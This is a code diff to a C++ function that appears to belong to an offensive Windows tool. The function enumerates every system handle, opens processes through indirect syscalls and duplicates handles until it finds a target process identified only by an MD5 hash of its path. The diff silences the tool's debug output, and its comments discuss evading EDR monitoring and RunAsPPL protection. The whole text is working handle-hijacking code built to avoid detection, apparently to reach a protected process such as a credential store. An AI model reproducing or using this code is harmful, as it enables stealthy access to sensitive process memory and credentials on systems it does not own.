@@ -30,11 +30,9 @@ HANDLE AXIOM_HDuplicate()
         else
             break;
     }
-    printf("[DUPLICATOR] QuerySysInfo success\n");
+    //printf("[DEBUG] QuerySysInfo success\n");
 
-    
-
-    printf("[DUPLICATOR] Looping through all system handles\n");
+    //printf("[DEBUG] Looping through all system handles\n");
     for (int i = 0; i < handleTableInformation->NumberOfHandles; i++)
     {
         CLIENT_ID clientId;
@@ -49,9 +47,11 @@ HANDLE AXIOM_HDuplicate()
         clientId.UniqueProcess = reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(handleInfo.UniqueProcessId));
         clientId.UniqueThread = 0;
 
+        // The particular part is easily flagged by EDRs that monitor OpenProcess events in the kernel
+        // I uh... don't know how to avoid this for now
         IndirectSyscall(
             status,
-            AXIOM_SSN_NtOpenProcess,
+            AXIOM_SSN_ZwOpenProcess,
             &hProcess,
             PROCESS_DUP_HANDLE,
             &objAttr,
@@ -60,7 +60,6 @@ HANDLE AXIOM_HDuplicate()
 
         if (NT_SUCCESS(status) && hProcess != nullptr)
         {
-            //LogString("[DUPLICATOR] OpenProcess success on handle 0x%p for PID %d\n", hProcess, handleInfo.UniqueProcessId);
             IndirectSyscall(
                 status,
                 AXIOM_SSN_NtDuplicateObject,
@@ -74,7 +73,6 @@ HANDLE AXIOM_HDuplicate()
 
             if (NT_SUCCESS(status) && hDuplicate != nullptr)
             {
-                //LogString("[DUPLICATOR] PROC_ALL_ACCESS obtained !\n");
                 POBJECT_TYPE_INFORMATION objTypeInfo = NULL;
                 ULONG objTypeInfoSize = sizeof(POBJECT_TYPE_INFORMATION);
 
@@ -105,8 +103,7 @@ HANDLE AXIOM_HDuplicate()
                     TCHAR buffer[MAX_PATH];
                     DWORD bufferSize = MAX_PATH;
 
-                    //printf("[DUPLICATOR] Handle opened towards a Process object: ");
-                    printf("[DUPLICATOR] Handle opened towards a Process object: ");
+                    //printf("[DEBUG] Handle opened towards a Process object: ");
                     if (QueryFullProcessImageName(hDuplicate, 0, buffer, &bufferSize))
                     {
                         // Identify the process based on DrunkHash of its path name
@@ -114,9 +111,10 @@ HANDLE AXIOM_HDuplicate()
                         char* c_buffer;
 
                         c_buffer = (char*)drunk_wchar_to_cstring(buffer);
-                        printf("%s\n", c_buffer);
-                        if (drunk_strcmp((const char*)drunk_md5(c_buffer), "bde503488303910db4ef6774fe16d6d7") == 0) {
-                            printf("[DUPLICATOR] Duplicated HANDLE pointer: 0x%p\n", hDuplicate);
+                        //printf("%s\n", c_buffer);
+                        if (drunk_strcmp((const char*)drunk_md5(c_buffer), "bde503488303910db4ef6774fe16d6d7") == 0)
+                        {
+                            //printf("[DEBUG] Duplicated HANDLE pointer: 0x%p\n", hDuplicate);
                             memset(c_buffer, 0, strlen(c_buffer));
                             free((void*)c_buffer);
                             return (hDuplicate);
@@ -124,11 +122,12 @@ HANDLE AXIOM_HDuplicate()
                         memset(c_buffer, 0, strlen(c_buffer));
                         free((void*)c_buffer);
                     }
-                    else
-                        printf("(none)\n");
+                    else {
+                        //printf("(none)\n");
+                    }
                 }
             }
-            //printf("[WARNING] PROC_ALL_ACCESS denied\n");
+            //printf("[WARNING] PROC_ALL_ACCESS denied (RunAsPPL ?)\n");
         }
     }
     return (NULL);
